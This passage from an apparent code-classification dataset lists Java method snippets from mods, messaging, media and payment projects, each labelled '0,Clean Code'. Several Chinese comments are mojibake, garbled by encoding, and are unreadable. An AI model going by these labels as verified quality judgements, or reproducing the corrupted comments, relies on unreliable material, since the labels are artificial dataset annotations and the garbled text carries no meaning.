 * <p>Prevents the sky layer from rendering when the fog distance is reduced from the default. This helps prevent situations where the sky can be seen through chunks culled by fog occlusion. This also fixes the vanilla issue <a href=""https://bugs.mojang.com/browse/MC-152504"">MC-152504</a> since it is also caused by being able to see the sky through invisible chunks.</p> <p>However, this fix comes with some caveats. When underwater, it becomes impossible to see the sun, stars, and moon since the sky is not rendered. While this does not exactly match the vanilla game, it is consistent with what Bedrock Edition does, so it can be considered vanilla-style. This is also more ""correct"" in the sense that underwater fog is applied to chunks outside of water, so the fog should also be covering the sun and sky.</p> <p>When updating Sodium to new releases of the game, please check for new ways the fog can be reduced in  {@link FogRenderer#setupFog}.</p>
 */
@Inject(method=""renderSky"",at=@At(""HEAD""),cancellable=true) private void preRenderSky(PoseStack poseStack,Matrix4f projectionMatrix,float f,Camera camera,boolean bl,Runnable runnable,CallbackInfo ci){
  if (!Iris.getCurrentPack().isPresent()) {
    Vec3 cameraPosition=camera.getPosition();
    Entity cameraEntity=camera.getEntity();
    boolean isSubmersed=camera.getFluidInCamera() != FogType.NONE;
    boolean hasBlindness=cameraEntity instanceof LivingEntity && ((LivingEntity)cameraEntity).hasEffect(MobEffects.BLINDNESS);
    boolean useThickFog=this.minecraft.level.effects().isFoggyAt(Mth.floor(cameraPosition.x()),Mth.floor(cameraPosition.y())) || this.minecraft.gui.getBossOverlay().shouldCreateWorldFog();
    if (isSubmersed || hasBlindness || useThickFog) {
      ci.cancel();
    }
  }
}",0,Clean Code
"@Override public void onFragmentDestroy(){
  NotificationCenter.getInstance(currentAccount).removeObserver(this,NotificationCenter.chatWasBoostedByUser);
  NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.emojiLoaded);
  NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.invalidateMotionBackground);
  getNotificationCenter().removeObserver(this,NotificationCenter.wallpaperSettedToUser);
  if (frameLayout != null && onGlobalLayoutListener != null) {
    frameLayout.getViewTreeObserver().removeOnGlobalLayoutListener(onGlobalLayoutListener);
  }
  if ((screenType == SCREEN_TYPE_CHANGE_BACKGROUND || screenType == SCREEN_TYPE_ACCENT_COLOR) && onSwitchDayNightDelegate == null) {
    AndroidUtilities.runOnUIThread(() -> Theme.setChangingWallpaper(false));
  }
  if (screenType == SCREEN_TYPE_CHANGE_BACKGROUND) {
    if (blurredBitmap != null) {
      blurredBitmap.recycle();
      blurredBitmap=null;
    }
    themeDelegate.applyChatServiceMessageColor();
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.didSetNewWallpapper);
  }
 else   if (screenType == SCREEN_TYPE_ACCENT_COLOR || screenType == SCREEN_TYPE_PREVIEW) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.didSetNewWallpapper);
  }
  if (screenType != SCREEN_TYPE_PREVIEW || accent != null) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.wallpapersNeedReload);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.wallpapersDidLoad);
  }
  super.onFragmentDestroy();
  checkBlur(null);
}
",0,Clean Code
"@Override public PayTransferDO createTransfer(PayTransferCreateReqVO reqVO,String userIp){
  reqVO.validate(validator);
  PayTransferCreateReqDTO req=INSTANCE.convert(reqVO).setUserIp(userIp);
  Long transferId=createTransfer(req);
  return getTransfer(transferId);
}
@Override public Long createTransfer(PayTransferCreateReqDTO reqDTO){
  PayAppDO payApp=appService.validPayApp(reqDTO.getAppId());
  PayChannelDO channel=channelService.validPayChannel(reqDTO.getAppId(),reqDTO.getChannelCode());
  PayClient client=channelService.getPayClient(channel.getId());
  if (client == null) {
    log.error(""[createTransfer][娓犻亾缂栧彿({}) 鎵句笉鍒板搴旂殑鏀粯瀹㈡埛绔痌"",channel.getId());
    throw exception(CHANNEL_NOT_FOUND);
  }
  PayTransferDO transfer=validateTransferCanCreate(reqDTO);
  if (transfer == null) {
    String no=noRedisDAO.generate(TRANSFER_NO_PREFIX);
    transfer=INSTANCE.convert(reqDTO).setChannelId(channel.getId()).setNo(no).setStatus(WAITING.getStatus()).setNotifyUrl(payApp.getTransferNotifyUrl());
    transferMapper.insert(transfer);
  }
  try {
    PayTransferUnifiedReqDTO transferUnifiedReq=INSTANCE.convert2(transfer).setOutTransferNo(transfer.getNo());
    PayTransferRespDTO unifiedTransferResp=client.unifiedTransfer(transferUnifiedReq);
    getSelf().notifyTransfer(channel,unifiedTransferResp);
  }
 catch (  Throwable e) {
    log.error(""[createTransfer][杞处 id({}) requestDTO({}) 鍙戠敓寮傚父]"",transfer.getId(),reqDTO,e);
  }
  return transfer.getId();
}",0,Clean Code
"private static void checkIntent(ILSPManagerService managerService,Intent intent){
  if (managerService == null)   return;
  if (Process.myUid() != BuildConfig.MANAGER_INJECTED_UID)   return;
  if (intent.getCategories() == null || !intent.getCategories().contains(""org.lsposed.manager.LAUNCH_MANAGER"")) {
    Hookers.logD(""Launching the original app, restarting"");
    try {
      managerService.restartFor(intent);
    }
 catch (    RemoteException e) {
      Hookers.logE(""restart failed"",e);
    }
 finally {
      Process.killProcess(Process.myPid());
    }
  }
}
",0,Clean Code
"/** 
 * @param manifestLoaderErrorThrower Throws errors affecting loading of manifests.
 * @param manifest The initial manifest.
 * @param periodIndex The index of the period in the manifest.
 * @param adaptationSetIndices The indices of the adaptation sets in the period.
 * @param trackSelection The track selection.
 * @param trackType The type of the tracks in the selection.
 * @param dataSource A {@link DataSource} suitable for loading the media data.
 * @param elapsedRealtimeOffsetMs If known, an estimate of the instantaneous difference betweenserver-side unix time and  {@link SystemClock#elapsedRealtime()} in milliseconds, specifiedas the server's unix time minus the local elapsed time. If unknown, set to 0.
 * @param maxSegmentsPerLoad The maximum number of segments to combine into a single request. Notethat segments will only be combined if their  {@link Uri}s are the same and if their data ranges are adjacent.
 * @param enableEventMessageTrack Whether to output an event message track.
 * @param closedCaptionFormats The {@link Format Formats} of closed caption tracks to be output.
 * @param playerTrackEmsgHandler The {@link PlayerTrackEmsgHandler} instance to handle emsgmessages targeting the player. Maybe null if this is not necessary.
 */
public DefaultDashChunkSource(LoaderErrorThrower manifestLoaderErrorThrower,DashManifest manifest,int periodIndex,int[] adaptationSetIndices,TrackSelection trackSelection,int trackType,DataSource dataSource,long elapsedRealtimeOffsetMs,int maxSegmentsPerLoad,boolean enableEventMessageTrack,List<Format> closedCaptionFormats,@Nullable PlayerTrackEmsgHandler playerTrackEmsgHandler){
  this.manifestLoaderErrorThrower=manifestLoaderErrorThrower;
  this.manifest=manifest;
  this.adaptationSetIndices=adaptationSetIndices;
  this.trackSelection=trackSelection;
  this.trackType=trackType;
  this.dataSource=dataSource;
  this.periodIndex=periodIndex;
  this.elapsedRealtimeOffsetMs=elapsedRealtimeOffsetMs;
  this.maxSegmentsPerLoad=maxSegmentsPerLoad;
  this.playerTrackEmsgHandler=playerTrackEmsgHandler;
  long periodDurationUs=manifest.getPeriodDurationUs(periodIndex);
  liveEdgeTimeUs=C.TIME_UNSET;
  List<Representation> representations=getRepresentations();
  representationHolders=new RepresentationHolder[trackSelection.length()];
  for (int i=0; i < representationHolders.length; i++) {
    Representation representation=representations.get(trackSelection.getIndexInTrackGroup(i));
    representationHolders[i]=new RepresentationHolder(periodDurationUs,trackType,representation,enableEventMessageTrack,closedCaptionFormats,playerTrackEmsgHandler);
  }
}",0,Clean Code
"@Override public void onReceive(Context context,Intent intent){
  ApplicationLoader.postInitApplication();
  Bundle remoteInput=RemoteInput.getResultsFromIntent(intent);
  if (remoteInput == null) {
    return;
  }
  CharSequence text=remoteInput.getCharSequence(NotificationsController.EXTRA_VOICE_REPLY);
  if (TextUtils.isEmpty(text)) {
    return;
  }
  long dialogId=intent.getLongExtra(""dialog_id"",0);
  int maxId=intent.getIntExtra(""max_id"",0);
  int topicId=intent.getIntExtra(""topic_id"",0);
  int currentAccount=intent.getIntExtra(""currentAccount"",0);
  if (dialogId == 0 || maxId == 0 || !UserConfig.isValidAccount(currentAccount)) {
    return;
  }
  AccountInstance accountInstance=AccountInstance.getInstance(currentAccount);
  if (DialogObject.isUserDialog(dialogId)) {
    TLRPC.User user=accountInstance.getMessagesController().getUser(dialogId);
    if (user == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.User user1=accountInstance.getMessagesStorage().getUserSync(dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putUser(user1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
 else   if (DialogObject.isChatDialog(dialogId)) {
    TLRPC.Chat chat=accountInstance.getMessagesController().getChat(-dialogId);
    if (chat == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.Chat chat1=accountInstance.getMessagesStorage().getChatSync(-dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putChat(chat1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
  sendMessage(accountInstance,text,dialogId,topicId,maxId);
}",0,Clean Code
"public static AudioInfo getAudioInfo(File file){
  try {
    byte header[]=new byte[12];
    RandomAccessFile randomAccessFile=new RandomAccessFile(file,""r"");
    randomAccessFile.readFully(header,0,8);
    randomAccessFile.close();
    InputStream input=new BufferedInputStream(new FileInputStream(file));
    if (header[4] == 'f' && header[5] == 't' && header[6] == 'y' && header[7] == 'p') {
      return new M4AInfo(input);
    }
 else     if (file.getAbsolutePath().endsWith(""mp3"")) {
      return new MP3Info(input,file.length());
    }
 else {
      return null;
    }
  }
 catch (  Exception e) {
    return null;
  }
}",0,Clean Code
"/** 
 * 鍙幏鍙栫涓�涓猵olluted type 褰撳瓨鍦ㄥ涓猵olluted type鏃讹紝鑾峰彇绗竴涓紝鍋氳繎浼煎寲澶勭悊
 * @return
 */
public String getFirstPollutedType(){
  if (!isPolluted)   return null;
  for (  String type : types) {
    if (type != null && (type.startsWith(""this"") || type.startsWith(""param-""))) {
      return type;
    }
  }
  return null;
}
",0,Clean Code
"@Override int getCurrentItemTop(){
  if (listView.getChildCount() <= 1) {
    return Integer.MAX_VALUE;
  }
  View child=listView.getChildAt(1);
  if (child == null) {
    return Integer.MAX_VALUE;
  }
  RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findContainingViewHolder(child);
  int top=(int)child.getY() - AndroidUtilities.dp(8);
  int newOffset=top > 0 && holder != null && holder.getAdapterPosition() == 1 ? top : 0;
  if (top >= 0 && holder != null && holder.getAdapterPosition() == 1) {
    newOffset=top;
  }
  return newOffset + AndroidUtilities.dp(25);
}",0,Clean Code
"public void filter(String text){
  if (mAllItems == null) {
    mAllItems=new ArrayList<>(getAll());
    mAllGroups=new ArrayList<>(getAllGroups());
  }
  super.clear();
  if (TextUtils.isEmpty(text)) {
    add(mAllItems);
    return;
  }
  List<Video> result=Helpers.filter(mAllItems,video -> {
    if (text.length() > 1 || Helpers.isNumeric(text)) {
      return Helpers.contains(video.getTitle(),text);
    }
 else {
      return Helpers.startsWith(video.getTitle(),text);
    }
  }
);
  if (result != null && (text.length() > 1 || Helpers.isNumeric(text))) {
    Collections.sort(result,(o1,o2) -> {
      String title1=o1.getTitle();
      String title2=o2.getTitle();
      boolean starts1=Helpers.startsWith(title1,text);
      boolean starts2=Helpers.startsWith(title2,text);
      return starts1 == starts2 ? title1.compareTo(title2) : starts1 ? -1 : 1;
    }
);
  }
  add(result);
}",0,Clean Code
"@Deprecated public String sendMessageData(List<byte[]> bodyList,String groupId,String streamId,long dt,int sid,boolean isSupportLF,String msgUUID,long timeout,TimeUnit timeUnit,Map<String,String> extraAttrMap){
  dt=ProxyUtils.covertZeroDt(dt);
  if (!ProxyUtils.isBodyValid(bodyList) || !ProxyUtils.isDtValid(dt) || !ProxyUtils.isAttrKeysValid(extraAttrMap)) {
    return SendResult.INVALID_ATTRIBUTES.toString();
  }
  addIndexCnt(groupId,streamId,bodyList.size());
  StringBuilder attrs=MessageUtils.convertAttrToStr(extraAttrMap);
  if (msgtype == 7 || msgtype == 8) {
    EncodeObject encodeObject=new EncodeObject(bodyList,msgtype,isCompress,isReport,isGroupIdTransfer,dt / 1000,sid,groupId,streamId,attrs.toString(),""data"","""");
    encodeObject.setSupportLF(isSupportLF);
    return sender.syncSendMessageIndex(encodeObject,msgUUID,timeout,timeUnit);
  }
  return null;
}",0,Clean Code
"/** 
 * Make a rounded line path
 * @param p1x the x-coordinate of the start point.
 * @param p1y the y-coordinate of the start point.
 * @param r1 the radius at the start point
 * @param p2x the x-coordinate of the end point.
 * @param p2y the y-coordinate of the end point.
 * @param r2 the radius at the end point
 * @return an instance of {@link Path} that holds the result rounded line, or an instance of{@link Path} that holds an empty path if the start and end points are equal.
 */
public Path makePath(final float p1x,final float p1y,final float r1,final float p2x,final float p2y,final float r2){
  mPath.rewind();
  final double dx=p2x - p1x;
  final double dy=p2y - p1y;
  final double l=Math.hypot(dx,dy);
  if (Double.compare(0.0d,l) == 0) {
    return mPath;
  }
  final double a=Math.atan2(dy,dx);
  final double dr=r2 - r1;
  final double ar=Math.asin(dr / l);
  final double aa=a - (RIGHT_ANGLE + ar);
  final double ab=a + (RIGHT_ANGLE + ar);
  final float cosa=(float)Math.cos(aa);
  final float sina=(float)Math.sin(aa);
  final float cosb=(float)Math.cos(ab);
  final float sinb=(float)Math.sin(ab);
  final float p1ax=p1x + r1 * cosa;
  final float p1ay=p1y + r1 * sina;
  final float p1bx=p1x + r1 * cosb;
  final float p1by=p1y + r1 * sinb;
  final float p2ax=p2x + r2 * cosa;
  final float p2ay=p2y + r2 * sina;
  final float p2bx=p2x + r2 * cosb;
  final float p2by=p2y + r2 * sinb;
  final float angle=(float)(aa * RADIAN_TO_DEGREE);
  final float ar2degree=(float)(ar * 2.0d * RADIAN_TO_DEGREE);
  final float a1=-180.0f + ar2degree;
  final float a2=180.0f + ar2degree;
  mArc1.set(p1x,p1y,p1x,p1y);
  mArc1.inset(-r1,-r1);
  mArc2.set(p2x,p2y,p2x,p2y);
  mArc2.inset(-r2,-r2);
  mPath.moveTo(p1x,p1y);
  mPath.arcTo(mArc1,angle,a1);
  mPath.moveTo(p2x,p2y);
  mPath.arcTo(mArc2,angle,a2);
  mPath.moveTo(p1ax,p1ay);
  mPath.lineTo(p1x,p1y);
  mPath.lineTo(p1bx,p1by);
  mPath.lineTo(p2bx,p2by);
  mPath.lineTo(p2x,p2y);
  mPath.lineTo(p2ax,p2ay);
  mPath.close();
  return mPath;
}",0,Clean Code
"private static InetAddress getInetAddress(){
  try {
    Enumeration<NetworkInterface> allNetInterfaces=NetworkInterface.getNetworkInterfaces();
    while (allNetInterfaces.hasMoreElements()) {
      NetworkInterface netInterface=allNetInterfaces.nextElement();
      Enumeration<InetAddress> addresses=netInterface.getInetAddresses();
      while (addresses.hasMoreElements()) {
        InetAddress ip=addresses.nextElement();
        if (ip != null && ip instanceof Inet4Address && !ip.isLoopbackAddress() && ip.getHostAddress().indexOf("":"") == -1) {
          return ip;
        }
      }
    }
  }
 catch (  Exception e) {
  }
  return null;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)104);
    output.writeUInt32NoTag(gachaType);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)26);
    output.writeMessageNoTag(gachaCeiling);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.gachaType,gachaType);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.gachaCeiling,gachaCeiling);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * addEvent
 * @param event   the event to added
 * @param maxPackCount   the max package count to cached
 * @param maxPackSize    the max package size to cached
 * @return  whether added the event
 */
public boolean addEvent(Event event,long maxPackCount,long maxPackSize){
  long eventLength=event.getBody().length;
  if (count >= maxPackCount || (count > 0 && size + eventLength > maxPackSize)) {
    return false;
  }
  this.events.add((ProxyEvent)event);
  this.count++;
  this.size+=eventLength;
  return true;
}",0,Clean Code
"@ModifyVariable(method=""handleEntityDamageEvent*"",at=@At(""HEAD""),index=1,argsOnly=true) private static DamageSource arclight$captureSource(DamageSource source,Entity entity){
  Entity damageEventEntity=ArclightCaptures.getDamageEventEntity();
  BlockPos damageEventBlock=ArclightCaptures.getDamageEventBlock();
  if (damageEventEntity != null && ((DamageSourceBridge)source).bridge$getCausingEntity() == null) {
    if (source.is(DamageTypes.LIGHTNING_BOLT)) {
      source=((DamageSourceBridge)source).bridge$customCausingEntity(damageEventEntity);
    }
  }
  if (damageEventBlock != null && ((DamageSourceBridge)source).bridge$directBlock() == null) {
    if (source.is(DamageTypes.CACTUS) || source.is(DamageTypes.SWEET_BERRY_BUSH) || source.is(DamageTypes.HOT_FLOOR)) {
      source=((DamageSourceBridge)source).bridge$directBlock(CraftBlock.at(entity.getCommandSenderWorld(),damageEventBlock));
    }
  }
  return source;
}",0,Clean Code
"private void setCurrentCategoryAndPageId(final int categoryId,final int categoryPageId,final boolean force){
  final int oldCategoryId=mEmojiCategory.getCurrentCategoryId();
  final int oldCategoryPageId=mEmojiCategory.getCurrentCategoryPageId();
  if (oldCategoryId == EmojiCategory.ID_RECENTS && categoryId != EmojiCategory.ID_RECENTS) {
    mEmojiPalettesAdapter.flushPendingRecentKeys();
  }
  if (force || oldCategoryId != categoryId || oldCategoryPageId != categoryPageId) {
    mEmojiCategory.setCurrentCategoryId(categoryId);
    mEmojiCategory.setCurrentCategoryPageId(categoryPageId);
    mEmojiPalettesAdapter.notifyDataSetChanged();
    mEmojiRecyclerView.scrollToPosition(categoryPageId);
  }
  final View old=mTabStrip.findViewWithTag((long)oldCategoryId);
  final View current=mTabStrip.findViewWithTag((long)categoryId);
  if (old instanceof ImageView)   Settings.getInstance().getCurrent().mColors.setColor((ImageView)old,ColorType.EMOJI_CATEGORY);
  if (current instanceof ImageView)   Settings.getInstance().getCurrent().mColors.setColor((ImageView)current,ColorType.EMOJI_CATEGORY_SELECTED);
}
",0,Clean Code
"/** 
 * 鑾峰彇鎵�鏈夎妭鐐圭殑鍏ㄨ矾寰勫悕绉板锛氭渤鍗楃渷/鐭冲搴勫競/鏂板崕鍖�
 * @param areas 鍦板尯鏍�
 * @return 鎵�鏈夎妭鐐圭殑鍏ㄨ矾寰勫悕绉�
 */
public static List<String> getAreaNodePathList(List<Area> areas){
  List<String> paths=new ArrayList<>();
  areas.forEach(area -> getAreaNodePathList(area,"""",paths));
  return paths;
}
/** 
 * 鏋勫缓涓�妫垫爲鐨勬墍鏈夎妭鐐圭殑鍏ㄨ矾寰勫悕绉帮紝骞跺皢鍏跺瓨鍌ㄤ负 ""绁栧厛/鐖剁骇/瀛愮骇"" 鐨勫舰寮�
 * @param node  鐖惰妭鐐�
 * @param path  鍏ㄨ矾寰勫悕绉�
 * @param paths 鍏ㄨ矾寰勫悕绉板垪琛紝鐪佷唤/鍩庡競/鍦板尯
 */
private static void getAreaNodePathList(Area node,String path,List<String> paths){
  if (node == null) {
    return;
  }
  String currentPath=path.isEmpty() ? node.getName() : path + ""/"" + node.getName();
  paths.add(currentPath);
  for (  Area child : node.getChildren()) {
    getAreaNodePathList(child,currentPath,paths);
  }
}
",0,Clean Code
"@Test @Order(1) public void queryAll(){
  for (  DialectProperties dialectProperties : dialectPropertiesList) {
    String dbTypeEnum=dialectProperties.getDbType();
    Long dataSourceId=TestUtils.nextLong();
    putConnect(dialectProperties.getUrl(),dialectProperties.getUsername(),dialectProperties.getPassword(),dialectProperties.getDbType(),dialectProperties.getDatabaseName(),dataSourceId,null);
    DataSourcePreConnectParam dataSourceCreateParam=new DataSourcePreConnectParam();
    dataSourceCreateParam.setType(dbTypeEnum);
    dataSourceCreateParam.setUrl(dialectProperties.getUrl());
    dataSourceCreateParam.setUser(dialectProperties.getUsername());
    dataSourceCreateParam.setPassword(dialectProperties.getPassword());
    dataSourceService.preConnect(dataSourceCreateParam);
    DatabaseQueryAllParam databaseQueryAllParam=new DatabaseQueryAllParam();
    databaseQueryAllParam.setDataSourceId(dataSourceId);
    ListResult<Database> databaseList=databaseService.queryAll(databaseQueryAllParam);
    log.info(""Querying the database returns: {}"",JSON.toJSONString(databaseList));
    Database Database=databaseList.getData().stream().filter(database -> dialectProperties.getDatabaseName().equals(database.getName())).findFirst().orElse(null);
    Assertions.assertNotNull(Database,""Query database failed"");
    removeConnect();
  }
}",0,Clean Code
"/** 
 * Groups  {@code widgetItems} into a 2D array which matches their appearance in a UI table whilemaintaining their order. This function is a variant of {@code groupWidgetItemsIntoTableWithoutReordering} in that this uses widget pixels forcalculation. <p>Grouping: 1. Widgets and shortcuts never group together in the same row. 2. The ordered widgets are grouped together in the same row until their individual occupying pixels exceed the total allowed pixels for the cell. 3. The ordered shortcuts are grouped together in the same row until their individual occupying pixels exceed the total allowed pixels for the cell. 4. If there is only one widget in a row, its width may exceed the  {@code rowPx}. <p>Let's say the  {@code rowPx} is set to 600 and we have 5 widgets. Widgets can be groupedin the same row if each of their individual occupying pixels does not exceed {@code rowPx} / 5 - 2 * {@code cellPadding}. Example 1: Row 1: 200x200, 200x300, 100x100. Average horizontal pixels is 200 and no widgets exceed that width. This is okay. Example 2: Row 1: 200x200, 400x300, 100x100. Average horizontal pixels is 200 and one widget exceed that width. This is not allowed. Example 3: Row 1: 700x400. This is okay because this is the only item in the row.
 */
public static List<ArrayList<WidgetItem>> groupWidgetItemsUsingRowPxWithoutReordering(List<WidgetItem> widgetItems,Context context,final DeviceProfile dp,final @Px int rowPx,final @Px int cellPadding){
  List<ArrayList<WidgetItem>> widgetItemsTable=new ArrayList<>();
  ArrayList<WidgetItem> widgetItemsAtRow=null;
  for (  WidgetItem widgetItem : widgetItems) {
    if (widgetItemsAtRow == null) {
      widgetItemsAtRow=new ArrayList<>();
      widgetItemsTable.add(widgetItemsAtRow);
    }
    int numOfWidgetItems=widgetItemsAtRow.size();
    @Px int individualSpan=(rowPx / (numOfWidgetItems + 1)) - (2 * cellPadding);
    if (numOfWidgetItems == 0) {
      widgetItemsAtRow.add(widgetItem);
    }
 else     if (widgetItem.hasSameType(widgetItemsAtRow.get(numOfWidgetItems - 1)) && widgetItemsAtRow.stream().allMatch(item -> WidgetSizes.getWidgetItemSizePx(context,dp,item).getWidth() <= individualSpan) && WidgetSizes.getWidgetItemSizePx(context,dp,widgetItem).getWidth() <= individualSpan) {
      widgetItemsAtRow.add(widgetItem);
    }
 else {
      widgetItemsAtRow=new ArrayList<>();
      widgetItemsTable.add(widgetItemsAtRow);
      widgetItemsAtRow.add(widgetItem);
    }
  }
  return widgetItemsTable;
}",0,Clean Code
"/** 
 * 缁勮妯℃澘娑堟伅鐨勫弬鏁�
 */
private List<AlipayOpenAppMiniTemplatemessageSendRequest> assembleReq(Set<String> receiver,AlipayMiniProgramContentModel alipayMiniProgramContentModel){
  List<AlipayOpenAppMiniTemplatemessageSendRequest> requestList=new ArrayList<>(receiver.size());
  for (  String toUserId : receiver) {
    AlipayOpenAppMiniTemplatemessageSendRequest request=new AlipayOpenAppMiniTemplatemessageSendRequest();
    AlipayOpenAppMiniTemplatemessageSendModel model=new AlipayOpenAppMiniTemplatemessageSendModel();
    if (toUserId.startsWith(""2088"")) {
      model.setToUserId(toUserId);
    }
 else {
      model.setToOpenId(toUserId);
    }
    model.setToUserId(toUserId);
    model.setUserTemplateId(alipayMiniProgramContentModel.getTemplateId());
    model.setPage(alipayMiniProgramContentModel.getPage());
    model.setData(getAlipayMiniProgramParam(alipayMiniProgramContentModel.getMiniProgramParam()));
    request.setBizModel(model);
    requestList.add(request);
  }
  return requestList;
}",0,Clean Code
"@Test public void clientShouldBeAbleToRemoveLogPoint() throws InterruptedException, ExecutionException, TimeoutException {
  WebSocketClient webSocketUserClient=new WebSocketClient(port,createClientTokenCredentials(USER_TOKEN));
  try {
    assertConnected(webSocketUserClient);
    WebSocketClient webSocketAppClient1a=null;
    try {
      webSocketAppClient1a=new WebSocketClient(port,createAppCredentials(API_KEY,""123"",""app1a"",""dev"",""1.0.1-SNAPSHOT""));
      assertConnected(webSocketAppClient1a);
      String requestId1=UUID.randomUUID().toString();
      List<ApplicationFilter> filters=new ArrayList<>();
      ApplicationFilter filter=new ApplicationFilter();
      filter.setName(""app1a"");
      filters.add(filter);
      PutLogPointRequest putLogPointRequest=new PutLogPointRequest();
      putLogPointRequest.setId(requestId1);
      putLogPointRequest.setFileName(""Test.java"");
      putLogPointRequest.setClient(CLIENT);
      putLogPointRequest.setLineNo(10);
      putLogPointRequest.setPersist(true);
      putLogPointRequest.setConditionExpression(""test == 1"");
      putLogPointRequest.setApplicationFilters(filters);
      putLogPointRequest.setExpireCount(1);
      putLogPointRequest.setExpireSecs(-1);
      putLogPointRequest.setLogExpression(""test"");
      CompletableFuture completableFuture1=registerForWaitingClientMessage(requestId1);
      webSocketUserClient.request(putLogPointRequest,PutLogPointResponse.class);
      completableFuture1.get(30,TimeUnit.SECONDS);
      ListLogPointsRequest listLogPointRequest=new ListLogPointsRequest();
      listLogPointRequest.setId(UUID.randomUUID().toString());
      ListLogPointsResponse listLogPointResponse=webSocketUserClient.requestSync(listLogPointRequest,ListLogPointsResponse.class,30,TimeUnit.SECONDS);
      assertNotNull(listLogPointResponse);
      LogPoint lp=listLogPointResponse.getLogPoints().get(0);
      String requestId2=UUID.randomUUID().toString();
      RemoveLogPointRequest removeLogPointRequest=new RemoveLogPointRequest();
      removeLogPointRequest.setId(requestId2);
      removeLogPointRequest.setLogPointId(lp.getId());
      removeLogPointRequest.setPersist(true);
      CompletableFuture completableFuture2=registerForWaitingClientMessage(requestId2);
      webSocketUserClient.request(removeLogPointRequest,RemoveLogPointResponse.class);
      completableFuture2.get(30,TimeUnit.SECONDS);
      listLogPointRequest=new ListLogPointsRequest();
      listLogPointRequest.setId(UUID.randomUUID().toString());
      listLogPointResponse=webSocketUserClient.requestSync(listLogPointRequest,ListLogPointsResponse.class,30,TimeUnit.SECONDS);
      assertNotNull(listLogPointResponse);
      assertTrue(listLogPointResponse.getLogPoints().isEmpty());
    }
  finally {
      if (webSocketAppClient1a != null) {
        webSocketAppClient1a.close();
      }
    }
  }
  finally {
    webSocketUserClient.close();
  }
}",0,Clean Code
"public WatchOnlyDialog(String walletName){
  super(""Create Watch Only Wallet - "" + walletName,walletName);
  setHints(List.of(Hint.CENTERED));
  Panel mainPanel=new Panel();
  mainPanel.setLayoutManager(new GridLayout(2).setVerticalSpacing(0));
  mainPanel.addComponent(new EmptySpace(TerminalSize.ONE));
  mainPanel.addComponent(new EmptySpace(TerminalSize.ZERO));
  TerminalSize screenSize=SparrowTerminal.get().getScreen().getTerminalSize();
  int descriptorWidth=Math.min(Math.max(20,screenSize.getColumns() - 20),120);
  mainPanel.addComponent(new Label(""Output descriptor or xpub""));
  mainPanel.addComponent(new EmptySpace(TerminalSize.ZERO));
  descriptor=new TextBox(new TerminalSize(descriptorWidth,10));
  mainPanel.addComponent(descriptor);
  mainPanel.addComponent(new EmptySpace(TerminalSize.ZERO));
  Panel buttonPanel=new Panel();
  buttonPanel.setLayoutManager(new GridLayout(2).setHorizontalSpacing(1));
  buttonPanel.addComponent(new Button(""Cancel"",this::onCancel));
  importWallet=new Button(""Import Wallet"",this::createWallet).setLayoutData(GridLayout.createLayoutData(GridLayout.Alignment.CENTER,GridLayout.Alignment.CENTER,true,false));
  importWallet.setEnabled(false);
  buttonPanel.addComponent(importWallet);
  mainPanel.addComponent(new EmptySpace(TerminalSize.ONE));
  mainPanel.addComponent(new EmptySpace(TerminalSize.ZERO));
  buttonPanel.setLayoutData(GridLayout.createLayoutData(GridLayout.Alignment.END,GridLayout.Alignment.CENTER,false,false)).addTo(mainPanel);
  mainPanel.addComponent(new EmptySpace(TerminalSize.ZERO));
  setComponent(mainPanel);
  descriptor.setTextChangeListener((newText,changedByUserInteraction) -> {
    String line=newText.replaceAll(""\\s+"","""");
    try {
      OutputDescriptor.getOutputDescriptor(line);
      importWallet.setEnabled(true);
    }
 catch (    Exception e1) {
      try {
        ExtendedKey.fromDescriptor(line);
        importWallet.setEnabled(true);
      }
 catch (      Exception e2) {
        importWallet.setEnabled(false);
      }
    }
    if (changedByUserInteraction) {
      List<String> lines=splitString(newText,descriptorWidth);
      String splitText=lines.stream().reduce((s1,s2) -> s1 + ""\n"" + s2).get();
      if (!newText.equals(splitText)) {
        descriptor.setText(splitText);
        TerminalPosition pos=descriptor.getCaretPosition();
        if (pos.getRow() == lines.size() - 2 && pos.getColumn() == lines.get(lines.size() - 2).length()) {
          descriptor.setCaretPosition(lines.size() - 1,lines.get(lines.size() - 1).length());
        }
      }
    }
  }
);
}",0,Clean Code
"@Override public Predicate<ServerWebExchange> apply(Config config){
  return new GatewayPredicate(){
    @Override public boolean test(    ServerWebExchange exchange){
      String bizApp=exchange.getRequest().getHeaders().getFirst(""x-biz-app"");
      if (StringUtils.isBlank(bizApp)) {
        return false;
      }
      String[] values=bizApp.split("","");
      String stageId=values[values.length - 1];
      Optional<String> optionalPattern=config.getPatterns().stream().filter(pattern -> pathMatcher.match(pattern,stageId)).findFirst();
      return optionalPattern.isPresent();
    }
    @Override public String toString(){
      return String.format(""StageId: %s"",config.getPatterns());
    }
  }
;
}",0,Clean Code
"/** 
 * Constructor used for creating an abstract media-list header presenter of a given theme.
 * @param context The context the user of this presenter is running in.
 * @param mThemeResId The resource id of the desired theme used for styling of this presenter.
 */
